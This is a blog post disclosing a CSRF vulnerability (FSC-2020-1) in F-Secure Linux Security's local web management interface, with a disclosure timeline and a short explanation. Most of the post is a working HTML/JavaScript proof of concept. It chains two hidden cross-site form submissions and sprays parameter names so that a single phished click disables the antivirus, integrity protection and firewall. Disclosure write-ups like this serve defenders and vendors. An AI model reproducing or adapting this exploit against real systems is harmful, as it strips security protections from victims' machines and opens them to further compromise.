@@ -1,0 +1,143 @@
+---
+layout: post
+title:  "FSC-2020-1"
+date:   2020-08-07 17:13:37 +0100
+categories: bug
+---
+
+<style>
+code {
+  white-space : pre-wrap !important;
+}
+</style>
+
+
+# Single-click double CSRF to disable Linux Security (from F-Secure)
+
+
+### Timeline
+* 21 April 2020 - Bug reported to F-Secure <br/>
+* 14 May 2020 - F-Secure releases a *hotfix* to address the bug <br/>
+* 19 May 2020 - F-Secure releases a Security Advisory for the bug ([FSC-2020-1](https://www.f-secure.com/en/business/support-and-downloads/security-advisories/fsc-2020-1))
+
+### The bug
+
+The security solution "Linux Security" is manageable, after installation, browsing a local instance of Tomcat available at `http://localhost:28080`
+
+Unfortunately, the web application was missing proper anti-CSRF tokens to prevent CSRF attacks from arbitrary websites. Although the solution was somehow trying to avoid CSRF attacks by changing the name of some of the variables/parameters (in the form of incremental numbers) after every interaction with the web interface, that wasn't enough.
+
+I was able to create the following PoC which sprays the variables' name space and chains 2 CSRF to: **Disable the anti-virus, system integrity protection and the firewall** with a single "phished" click:
+
+```html
+<html>
+<head>
+<script>
+function chainForm(){
+  setTimeout(new function(){document.getElementById('submit1').click() }, 2000)
+}
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.withCredentials = true;
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.body.innerHTML += this.responseText;
+    }
+  };
+  xhttp.open("GET","http://localhost:28080/fsecure/webui", true);
+  xhttp.send();
+}
+</script>
+</head>
+<body onload="loadDoc(); ">
+  <script>history.pushState('', '', '/')</script>
+    <iframe style="display:none" name="myframe"></iframe>
+    <iframe style="display:none" name="myframe2"></iframe>
+    <form id="form1" style="display:none" target="myframe" action="http://localhost:28080/fsecure/webui" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="v29" value="&#45;1" />
+      <input type="hidden" name="v28" value="&#45;1" />
+      <input type="hidden" name="v31" value="0" />
+      <input type="hidden" name="v30" value="0" />
+      <input type="hidden" name="wa&#95;clientprobe" value="1" />
+      <input type="hidden" name="wa&#95;jsversion" value="JavaScript&#32;1&#46;5" />
+      <input type="hidden" name="wa&#95;screenwidth" value="1920" />
+      <input type="hidden" name="wa&#95;screenheight" value="1440" />
+      <input type="hidden" name="wa&#95;javaenabled" value="false" />
+      <input type="hidden" name="v27" value="1" />
+      <input type="hidden" name="declare&#58;v7" value="" />
+      <input type="hidden" name="v7" value="2" />
+      <input type="hidden" name="declare&#58;v10" value="" />
+      <input type="hidden" name="v10" value="8" />
+      <input type="hidden" name="declare&#58;v13" value="" />
+      <input type="hidden" name="v13" value="2" />
+      <input type="hidden" name="v15" value="null" />
+      <input type="hidden" name="v16" value="true" />
+      <input type="hidden" name="v22" value="null" />
+      <input type="hidden" name="v23" value="true" />
+      <input type="hidden" name="declare&#58;v5" value="" />
+      <input type="hidden" name="v1" value="false" />
+      <input type="hidden" name="v2" value="false" />
+      <input type="hidden" name="v3" value="false" />
+      <input type="hidden" name="v4" value="false" />
+      <input type="hidden" name="v24" value="" />
+      <!--<input type="hidden" name="d101806e199&#95;ACTIVE&#95;ITEM" value="" />-->
+      <input type="hidden" name="v32" value="" />
+      <input id="submit1" type="submit" value="Submit request"  onclick="document.getElementById('form1').style.display = 'none';"/>
+
+      <!-- Spray the variables' name space with 2 (Disable for AV and Integrity) -->
+      <input type="hidden" name=v29 value="2" />
+<input type="hidden" name=v32 value="2" />
+<input type="hidden" name=v35 value="2" />
+<input type="hidden" name=v30 value="2" />
+<input type="hidden" name=v33 value="2" />
+<input type="hidden" name=v36 value="2" />
+<input type="hidden" name=v31 value="2" />
+[...] Here the form just continues until "v1000" is set to "2"
+
+    </form>
+
+    <form id="form2" target="myframe2" action="http://localhost:28080/fsecure/webui" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="v29" value="&#45;1" />
+      <input type="hidden" name="v28" value="&#45;1" />
+      <input type="hidden" name="v31" value="0" />
+      <input type="hidden" name="v30" value="0" />
+      <input type="hidden" name="wa&#95;clientprobe" value="1" />
+      <input type="hidden" name="wa&#95;jsversion" value="JavaScript&#32;1&#46;5" />
+      <input type="hidden" name="wa&#95;screenwidth" value="1920" />
+      <input type="hidden" name="wa&#95;screenheight" value="1440" />
+      <input type="hidden" name="wa&#95;javaenabled" value="false" />
+      <input type="hidden" name="v27" value="1" />
+      <input type="hidden" name="declare&#58;v7" value="" />
+      <input type="hidden" name="v7" value="2" />
+      <input type="hidden" name="declare&#58;v10" value="" />
+      <input type="hidden" name="v10" value="8" />
+      <input type="hidden" name="declare&#58;v13" value="" />
+      <input type="hidden" name="v13" value="2" />
+      <input type="hidden" name="v15" value="null" />
+      <input type="hidden" name="v16" value="true" />
+      <input type="hidden" name="v22" value="null" />
+      <input type="hidden" name="v23" value="true" />
+      <input type="hidden" name="declare&#58;v5" value="" />
+      <input type="hidden" name="v1" value="false" />
+      <input type="hidden" name="v2" value="false" />
+      <input type="hidden" name="v3" value="false" />
+      <input type="hidden" name="v4" value="false" />
+      <input type="hidden" name="v24" value="" />
+      <!--<input type="hidden" name="d101806e199&#95;ACTIVE&#95;ITEM" value="" />-->
+      <input type="hidden" name="v32" value="" />
+      <input id="submit2" type="submit" value="Submit Request"  onclick="document.getElementById('form2').style.display = 'none';chainForm();"/>
+
+      <!-- Spray the variables' name space with 8 (Disable Firewall) -->
+      <input type="hidden" name=v29 value="8" />
+<input type="hidden" name=v32 value="8" />
+<input type="hidden" name=v35 value="8" />
+<input type="hidden" name=v30 value="8" />
+<input type="hidden" name=v33 value="8" />
+<input type="hidden" name=v36 value="8" />
+<input type="hidden" name=v31 value="8" />
+[...] Here, as above, the form just continues until "v1000" is set to "8"
+
+</form>
+</body>
+</html>
+
+```
